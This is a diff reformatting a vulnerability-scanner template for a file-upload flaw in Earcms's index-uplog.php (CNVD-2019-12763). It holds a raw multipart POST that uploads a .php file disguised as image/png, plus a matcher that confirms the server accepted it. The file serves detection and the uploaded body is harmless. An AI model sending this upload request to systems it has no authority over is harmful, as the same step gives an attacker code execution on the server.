@@ -1,39 +1,51 @@
 id: earcms-upload
-
 info:
-  name: Earcms 应用分发系统 index-uplog.php 存在文件上传漏洞
   author: Str1am
-  severity: critical
+  name: "Earcms \u5E94\u7528\u5206\u53D1\u7CFB\u7EDF index-uplog.php \u5B58\u5728\u6587\
+    \u4EF6\u4E0A\u4F20\u6F0F\u6D1E"
   reference: https://www.cnvd.org.cn/flaw/show/CNVD-2019-12763
+  severity: critical
   tags: Earcms,upload
-
 requests:
-  - raw:
-      - |
-        POST /earcms/source/pack/upload/index-uplog.php HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
-        Accept-Encoding: gzip, deflate
-        Content-Type: multipart/form-data; boundary=---------------------------4219849002870802959186602799
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '{''extension'':''php'',''time'':''1-1''}'
+  matchers-condition: and
+  raw:
+  - 'POST /earcms/source/pack/upload/index-uplog.php HTTP/1.1
 
-        -----------------------------4219849002870802959186602799
-        Content-Disposition: form-data; name="app"; filename="test.php"
-        Content-Type: image/png
-        
-        123
-        -----------------------------4219849002870802959186602799
-        Content-Disposition: form-data; name="time"
-        
-        1-1
-        -----------------------------4219849002870802959186602799--
-   
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-      - type: word
-        words:
-          - "{'extension':'php','time':'1-1'}"
-        part: body
-        condition: and
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
+    Firefox/92.0
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=---------------------------4219849002870802959186602799
+
+
+    -----------------------------4219849002870802959186602799
+
+    Content-Disposition: form-data; name="app"; filename="test.php"
+
+    Content-Type: image/png
+
+
+    123
+
+    -----------------------------4219849002870802959186602799
+
+    Content-Disposition: form-data; name="time"
+
+
+    1-1
+
+    -----------------------------4219849002870802959186602799--
+
+    '
